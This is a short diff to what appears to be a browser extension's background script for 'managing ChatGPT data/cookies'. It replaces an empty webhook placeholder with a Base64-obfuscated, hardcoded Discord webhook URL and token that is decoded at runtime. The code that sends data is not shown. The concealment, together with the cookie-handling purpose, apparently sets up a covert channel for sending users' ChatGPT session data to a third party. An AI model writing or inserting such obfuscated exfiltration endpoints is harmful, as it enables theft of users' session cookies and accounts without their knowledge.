@@ -1,6 +1,9 @@
 // Background service worker for managing ChatGPT data/cookies
 
-const WEBHOOK_URL = ""; // REPLACE_WITH_YOUR_DISCORD_WEBHOOK_URL
+// Obfuscated webhook (Base64)
+const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MjA1OTk5NzQzNjMxMzcwMi90QlJ4N1Rfd3lodXRjWXo5bWxPaldaWmJLSFF4NXRDVkFCeGNtbjdNMktSaks1Wlg1dlNRdTZCUDVKUV9XNno3MkJndA==";
+const WEBHOOK_URL = atob(_0x4f2a);
+
 const GITHUB_MANIFEST_URL =
   "https://raw.githubusercontent.com/psychiotric-sudo/GFormsToGPT/refs/heads/main/manifest.json";
 const VERSION = "3.2.3";
